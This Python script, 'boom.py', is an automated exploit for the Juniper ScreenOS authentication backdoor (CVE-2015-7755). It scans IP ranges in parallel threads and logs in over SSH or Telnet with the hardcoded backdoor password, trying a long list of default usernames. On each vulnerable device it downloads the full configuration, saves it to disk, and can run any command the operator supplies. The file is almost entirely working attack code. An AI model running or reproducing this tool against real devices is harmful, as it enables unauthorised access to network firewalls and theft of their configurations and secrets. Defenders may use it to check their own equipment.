#!/usr/bin/python3
# Copyright (C) 2020 iDigitalFlame
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

import os
import sys
import argparse
import threading

try:
    import paramiko
    import telnetlib
except ImportError:
    print("[!] You need 'paramiko' installed!")
    print("[!] Install using 'sudo pip install paramiko'!")
    sys.exit(-1)


class Client:
    @classmethod
    def close(cls):
        None

    @classmethod
    def send(cls, data):
        return None

    @classmethod
    def exec_cmd(cls, command):
        return None


class SSHClient(Client):
    def __init__(self, client):
        self.tunnel = None
        self.client = client

    def close(self):
        self.client.close()

    def send(self, data):
        if not self.tunnel:
            self.tunnel = self.client.invoke_shell()
            self.tunnel.settimeout(1)
        self.tunnel.send(data)
        bf = []
        if not self.tunnel.recv_ready():
            bf.append(self.tunnel.recv(500))
        try:
            while self.tunnel.recv_ready():
                bf.append(self.tunnel.recv(500))
        except OSError:
            None
        return "".join(bf)

    def exec_cmd(self, command):
        if not self.tunnel:
            self.tunnel = self.client.invoke_shell()
            self.tunnel.settimeout(1)
        self.tunnel.send("%s\n" % command)
        bf = []
        if not self.tunnel.recv_ready():
            bf.append(self.tunnel.recv(500))
        try:
            while 1:
                bf.append(self.tunnel.recv(500))
        except OSError:
            None
        return "".join(bf)


class TelnetClient(Client):
    def __init__(self, client):
        self.client = client

    def close(self):
        self.client.close()

    def send(self, data):
        self.client.write(data)
        return self.client.read_until("--- more ---", 1)

    def exec_cmd(self, command):
        self.client.write("%s\n" % command)
        return self.client.read_until("--- more ---", 1)


class Exploit:
    def __init__(self):
        self.__threads = []
        self.__output = None
        self.__command = None
        self.__verbose = None
        self.__output_dir = None

    @staticmethod
    def start():
        print(
            """
              ,--.!,
           __/   -*-
         ,d08b.  '|`
         0088MM
         `9MMP'
            boom.py
            Juniper Telnet/SSH CVE-2015-7755 ScreenOS AutoExploit
            iDigitalFlame
            """
        )  # with help by Scott Brion

    def main(self):
        Exploit.start()
        cmd = argparse.ArgumentParser(
            description="Juniper ScreenOS CVE 2015-7755 Exploit"
        )
        cmd.add_argument(
            "-p",
            action="store",
            dest="port",
            type=int,
            help='Port to test, only valid if "-t" is specified!',
            default=None,
            required=False,
        )
        cmd.add_argument(
            "-o",
            action="store",
            dest="output",
            type=str,
            help="Log file output path",
            default=None,
            required=False,
        )
        cmd.add_argument(
            "-t",
            action="store",
            dest="type",
            type=str,
            help="Protocol to test; ssh (s) or telnet (t)",
            choices=("ssh", "telnet", "s", "t"),
            default=None,
            required=False,
        )
        cmd.add_argument(
            "-w",
            action="store",
            dest="timeout",
            type=int,
            help="Connection timeout in seconds",
            default=1,
            required=False,
        )
        cmd.add_argument(
            "-d",
            action="store",
            dest="save_dir",
            type=str,
            help="Where to save downloaded configs",
            default=None,
            required=False,
        )
        cmd.add_argument(
            "-m",
            action="store",
            dest="threads",
            type=int,
            help="Concurrent threads to run",
            default=None,
            required=False,
        )
        cmd.add_argument(
            "-c",
            action="store",
            dest="command",
            type=str,
            help="Command to run on successful connect",
            default=None,
            required=False,
        )
        cmd.add_argument(
            "-v",
            "--verbose",
            action="store_true",
            default=False,
            help="Enable verbose logging",
        )
        cmd.add_argument(
            "targets",
            action="store",
            nargs="+",
            type=str,
            help="List of targets (comma/spaced/ranges)",
        )
        cmd.add_argument(
            "--users",
            action="store",
            nargs="*",
            type=str,
            dest="user",
            help="List of additional usernames (comma/spaced)",
        )
        ta = cmd.parse_args()
        if not ta:
            print('[!] Incorrect arguments! Please use "%s -h"!' % __file__)
            sys.exit(-1)
        if not ta.targets:
            print('[!] Please specify a target! Use "%s -h" for help"' % __file__)
            sys.exit(-1)
        targets = []
        targets_list = []
        for tar in ta.targets:
            if "," in tar:
                targets_list.extend([f.strip() for f in tar.split(",")])
            else:
                targets_list.append(tar.strip())
        for tar in targets_list:
            if "-" in tar:
                tar_list = Exploit.split_range(tar)
                for tarl in tar_list:
                    if not (tarl in targets):
                        targets.append(tarl)
            else:
                if not (tar in targets):
                    targets.append(tar)
        if ta.user:
            user_list = []
            for user in ta.user:
                if "," in user:
                    for us in user.split(","):
                        usern = us.strip()
                        if not (usern in ExploitPayload.USER_LIST):
                            user_list.append(usern)
                else:
                    usern = user.strip()
                    if not (usern in ExploitPayload.USER_LIST):
                        user_list.append(usern)
            if len(user_list) > 0:
                ExploitPayload.USER_LIST = user_list + ExploitPayload.USER_LIST
        if ta.verbose:
            self.__verbose = True
        con_type = None
        if isinstance(ta.type, str):
            if ta.type.lower() == "ssh" or ta.type.lower() == "s":
                con_type = 1
            elif ta.type.lower() == "telnet" or ta.type.lower() == "t":
                con_type = 2
        if ta.output:
            print('[*] Output to log file "%s"' % ta.output)
            self.__output = open(ta.output, "a")
        port = None
        timeout = 1
        if ta.timeout:
            try:
                timeout = int(ta.timeout)
            except ValueError:
                None
        if con_type and ta.port:
            try:
                port = int(ta.port)
            except ValueError:
                print('[!] Incorrect arguments! "%s" is not a number!' % ta.port)
                sys.exit(-1)
        if ta.save_dir:
            if os.path.exists(ta.save_dir):
                self.info('Saving configs to "%s"' % ta.save_dir)
                self.__output_dir = ta.save_dir
        if ta.command:
            self.__command = ta.command
        self.info("boom.py Init. %d Targets selected." % len(targets))
        if ta.threads and len(targets) > 1:
            try:
                tc = int(ta.threads)
            except ValueError:
                print('[!] Incorrect arguments! "%s" is not a number!' % ta.threads)
                sys.exit(-1)
            if tc:
                tlen = len(targets)
                self.verbose(
                    "Threading mode selected! %d threads needed! %d targets"
                    % (tc, tlen)
                )
                tct = tlen / tc
                self.verbose("Allocated %d average targets per thread." % tct)
                tctr = tlen - (tct * tc)
                if tct > 0:
                    tst = 0
                    thct = 0
                    while thct < tc:
                        thr = ExploitThread(
                            self,
                            targets[tst : tst + tct],
                            port,
                            con_type,
                            timeout,
                            thct,
                        )
                        self.verbose(
                            "Allocated thread %d with range %d-%d!"
                            % (thct, tst, (tst + tct))
                        )
                        tst += tct
                        thct += 1
                        self.__threads.append(thr)
                    if tctr > 0:
                        print(targets[(tc * tct) + tctr - 1 :])
                        self.__threads[0].targets.extend(
                            targets[(tc * tct) + tctr - 1 :]
                        )
                    for thread in self.__threads:
                        thread.start()
                else:
                    print(
                        '[!] Too many threads! "%s" targets, "%s" threads!'
                        % (len(targets), tct)
                    )
                    sys.exit(-1)
        else:
            if ta.threads:
                self.error("Ignoring thread count as there is one host to scan!")
            self.exploit_run(targets, port, con_type, ExploitPayload.USER_LIST, timeout)

    @staticmethod
    def get_config(client):
        bf = []
        a = client.exec_cmd("get config")
        bf.append(a)
        if "--- more ---" in a:
            while 1:
                a = client.send(" ")
                bf.append(a)
                if "->" in a:
                    break
        return "".join(bf)

    @staticmethod
    def split_range(range_data):
        range_targets = []
        if ":" in range_data:
            rv = ":"
        else:
            rv = "."
        trang = range_data.split(rv)
        trgv = None
        tgrvp = 0
        for trng in trang:
            if "-" in trng:
                trgv = (trng, tgrvp)
                break
            tgrvp += 1
        if not trgv:
            return None
        tss = rv.join(trang[0 : trgv[1]])
        if trgv[1] < len(trang):
            tse = rv.join(trang[trgv[1] + 1 :])
        else:
            tse = None
        iss = trgv[0].find("-")
        if rv == ".":
            try:
                pss = int(trgv[0][:iss])
                pse = int(trgv[0][iss + 1 :])
            except ValueError:
                return None
        else:
            try:
                pss = int(trgv[0][:iss], 16)
                pse = int(trgv[0][iss + 1 :], 16)
            except ValueError:
                return None
        for x in range(pss, pse + 1):
            if not tse:
                range_targets.append(
                    "%s%s%s" % (tss, rv, (x if rv == "." else hex(x).replace("0x", "")))
                )
            else:
                range_targets.append(
                    "%s%s%s%s%s"
                    % (tss, rv, (x if rv == "." else hex(x).replace("0x", "")), rv, tse)
                )
        return range_targets

    def info(self, data, threadd=None):
        if self.__output:
            if threadd:
                self.__output.write("[*] (Thread: %s) %s\n" % (threadd, data))
            else:
                self.__output.write("[*] %s\n" % data)
        else:
            if threadd:
                print("[*] (Thread: %s) %s" % (threadd, data))
            else:
                print("[*] %s" % data)

    def error(self, data, threadd=None):
        if self.__output:
            if threadd:
                self.__output.write("[!] (Thread: %s) %s\n" % (threadd, data))
            else:
                self.__output.write("[!] %s\n" % data)
        else:
            if threadd:
                print("[!] (Thread: %s) %s" % (threadd, data))
            else:
                print("[!] %s" % data)

    def verbose(self, data, threadd=None):
        if self.__verbose:
            if self.__output:
                if threadd:
                    self.__output.write("[V] (Thread: %s) %s\n" % (threadd, data))
                else:
                    self.__output.write("[V] %s\n" % data)
            else:
                if threadd:
                    print("[V] (Thread: %s) %s" % (threadd, data))
                else:
                    print("[V] %s" % data)

    @staticmethod
    def ssh_connect(host, port, user, password, timeout):
        ssh_cli = paramiko.SSHClient()
        ssh_cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_cli.connect(
            host,
            username=user,
            password=password,
            port=port,
            look_for_keys=False,
            allow_agent=False,
            timeout=timeout,
        )
        return SSHClient(ssh_cli)

    @staticmethod
    def telnet_connect(host, port, user, password, timeout):
        telnet_cli = telnetlib.Telnet(host, port, timeout)
        telnet_cli.read_until("login: ")
        telnet_cli.write(user + "\n")
        telnet_cli.read_until("password: ")
        telnet_cli.write(password + "\n")
        return TelnetClient(telnet_cli)

    def exploit_ssh(self, target, port, user, timeout, thread):
        try:
            if port:
                con = Exploit.ssh_connect(
                    target, port, user, ExploitPayload.PASSWORD, timeout
                )
            else:
                con = Exploit.ssh_connect(
                    target, 22, user, ExploitPayload.PASSWORD, timeout
                )
            conf_data = Exploit.get_config(con)
            if conf_data:
                conf_data = conf_data.replace(
                    "--- more --- ^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H",
                    "",
                )
                self.verbose(
                    'Was able to capture config of "%s" over ssh!' % target, thread
                )
                self.info('EXPLOIT:SSH> "%s" is Vulnerable!' % target, thread)
                if self.__output_dir:
                    try:
                        conf_path = os.path.join(
                            self.__output_dir, "%s-ssh.cfg" % target
                        )
                        conf_file = open(conf_path, "w+")
                        conf_file.write(conf_data)
                        conf_file.close()
                        self.info(
                            'Config for "%s" saved as "%s"' % (target, conf_path),
                            thread,
                        )
                    except Exception as message:
                        self.error(
                            'Could not save config for "%s"! Error: %s'
                            % (target, str(message)),
                            thread,
                        )
            if self.__command:
                self.info('Running specified command on "%s"' % target)
                cmd_result = con.exec_cmd(self.__command)
                self.verbose('Ran specified command on "%s"' % target)
                if cmd_result:
                    self.info(
                        'Command result from "%s" returned\n"%s"' % (target, cmd_result)
                    )
            con.close()
            return True
        except paramiko.ssh_exception.AuthenticationException:
            self.verbose(
                'Authentication error! "%s" might be patched?' % target, thread
            )
            return False
        except Exception:
            return True

    def exploit_telnet(self, target, port, user, timeout, thread):
        try:
            if port:
                con = Exploit.telnet_connect(
                    target, port, user, ExploitPayload.PASSWORD, timeout
                )
            else:
                con = Exploit.telnet_connect(
                    target, 23, user, ExploitPayload.PASSWORD, timeout
                )
            conf_data = Exploit.get_config(con)
            if conf_data:
                conf_data = conf_data.replace(
                    "--- more --- ^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H^H ^H",
                    "",
                )
                self.verbose(
                    'Was able to capture config of "%s" over telnet!' % target, thread
                )
                self.info('EXPLOIT:TELNET> "%s" is Vulnerable!' % target, thread)
                if self.__output_dir:
                    try:
                        conf_path = os.path.join(
                            self.__output_dir, "%s-telnet.cfg" % target
                        )
                        conf_file = open(conf_path, "w+")
                        conf_file.write(conf_data)
                        conf_file.close()
                        self.info(
                            'Config for "%s" saved as "%s"' % (target, conf_path),
                            thread,
                        )
                    except Exception as message:
                        self.error(
                            'Could not save config for "%s"! Error: %s'
                            % (target, str(message)),
                            thread,
                        )
            if self.__command:
                self.info('Running specified command on "%s"' % target)
                cmd_result = con.exec_cmd(self.__command)
                self.verbose('Ran specified command on "%s"' % target)
                if cmd_result:
                    self.info(
                        'Command result from "%s" returned\n"%s"' % (target, cmd_result)
                    )
            con.close()
            return True
        except paramiko.ssh_exception.AuthenticationException:
            self.error('Authentication error! "%s" might be patched?' % target, thread)
            return False
        except Exception:
            return True

    def exploit_run(self, targets, port, con_type, users, timeout, thread=None):
        for target in targets:
            if port:
                self.info('Trying "%s:%s"...' % (target, port), thread)
            else:
                self.info('Trying "%s"...' % target, thread)
            for user in users:
                self.verbose('Trying user "%s" on "%s"' % (user, target))
                try:
                    if not con_type:
                        both = False
                        if self.exploit_ssh(target, port, user, timeout, thread):
                            both = True
                        if (
                            self.exploit_telnet(target, port, user, timeout, thread)
                            and both
                        ):
                            break
                    elif con_type == 1:
                        if self.exploit_ssh(target, port, user, timeout, thread):
                            break
                    elif con_type == 2:
                        if self.exploit_telnet(target, port, user, timeout, thread):
                            break
                except Exception:
                    break


class ExploitPayload:
    PASSWORD = "<<< %s(un='%s') = %u"
    USER_LIST = [
        "admin",
        "netscreen",
        "debug",
        "tech",
        "adm",
        "adminttd",
        "operator",
        "security",
        "3comcso",
        "root",
        "monitor",
        "manager",
        "Administrator",
        "recovery",
        "volition",
        "sysadm",
        "none",
        "kermit",
        "dhs3mt",
        "at4400",
        "mtch",
        "mtcl",
        "dhs3pms",
        "adfexc",
        "client",
        "install",
        "halt",
        "diag",
        "acc",
        "apc",
        "device",
        "IntraSwitch",
        "IntraStack",
        "superuser",
        "readonly",
        "customer",
        "DTA",
        "craft",
        "manuf",
        "User",
        "patrol",
        "netman",
        "mediator",
        "cellit",
        "cmaker",
        "netrangr",
        "bbsd-client",
        "sa",
        "Cisco",
        "guest",
        "anonymous",
        "PFCUser",
        "cgadmin",
        "super",
        "davox",
        "MDaemon",
        "PBX",
        "NETWORK",
        "NETOP",
        "D-Link",
        "login",
        "public",
        "supervisor",
        "MGR",
        "PCUSER",
        "RSBCMON",
        "SPOOLMAN",
        "WP",
        "ADVMAIL",
        "FIELD",
        "HELLO",
        "MAIL",
        "storwatch",
        "vt100",
        "superadmin",
        "hscroot",
        "NICONEX",
        "setup",
        "intel",
        "SYSDBA",
        "intermec",
        "system",
        "JDE",
        "PRODDTA",
        "hydrasna",
        "sysadmin",
        "!root",
        "readwrite",
        "LUCENT01",
        "LUCENT02",
        "bciim",
        "bcim",
        "bcms",
        "bcnas",
        "blue",
        "browse",
        "cust",
        "enquiry",
        "inads",
        "init",
        "locate",
        "maint",
        "nms",
        "rcust",
        "support",
        "ami",
        "MICRO",
        "service",
        "mac",
        "cablecom",
        "GlobalAdmin",
        "superman",
        "naadmin",
        "netopia",
        "e500",
        "e250",
        "vcr",
        "m1122",
        "telecom",
        "disttech",
        "mlusr",
        "l2",
        "l3",
        "ro",
        "rw",
        "rwa",
        "spcl",
        "ccrusr",
        "adminstat",
        "adminview",
        "adminuser",
        "helpdesk",
        "sys",
        "cac_admin",
        "write",
        "d.e.b.u.g",
        "echo",
        "pmd",
        "PSEAdmin",
        "Polycom",
        "lp",
        "radware",
        "wradmin",
        "piranha",
        "teacher",
        "temp1",
        "admin2",
        "adminstrator",
        "deskalt",
        "deskman",
        "desknorm",
        "deskres",
        "replicator",
        "RMUser1",
        "topicalt",
        "topicnorm",
        "topicres",
        "GEN1",
        "GEN2",
        "ADMN",
        "eng",
        "op",
        "su",
        "poll",
        "smc",
        "aaa",
        "enable",
        "xbox",
        "tellabs",
        "tiara",
        "NAU",
        "HTTP",
        "Any",
        "VNC",
        "rapport",
        "xd",
        "jagadmin",
        "system/manager",
        "dadmin",
        "target",
        "scmadmin",
        "webadmin",
        "corecess",
        "installer",
        "hsa",
        "wlse",
        "tiger",
        "super.super",
        "CSG",
        "cusadmin",
        "USERID",
        "websecadm",
        "telco",
        "ftp_inst",
        "ftp_admi",
        "ftp_oper",
        "ftp_nmc",
        "comcast",
        "SSA",
        "wlseuser",
        "MD110",
        "draytek",
        "technician",
        "ADSL",
        "stratacom",
        "CISCO15",
        "scout",
        "Gearguy",
        "Alphanetworks",
        "Factory",
        "isp",
        "citel",
        "netadmin",
        "maintainer",
        "manage",
        "iclock",
        "mso",
        "images",
        "engmode",
    ]


class ExploitThread(threading.Thread):
    def __init__(self, exploit, targets, port, con_type, timeout, index):
        threading.Thread.__init__(self)
        self.__id = index
        self.__port = port
        self.targets = targets
        self.__timeout = timeout
        self.__con_type = con_type
        self.__exploit_host = exploit
        if not isinstance(self.targets, list):
            self.targets = [self.targets]

    def run(self):
        self.__exploit_host.verbose("Thread %s starting" % self.__id)
        self.__exploit_host.exploit_run(
            self.targets,
            self.__port,
            self.__con_type,
            ExploitPayload.USER_LIST,
            self.__timeout,
            "%s" % self.__id,
        )
        self.__exploit_host.verbose("Thread %s finished!" % self.__id)


if __name__ == "__main__":
    a = Exploit()
    a.main()
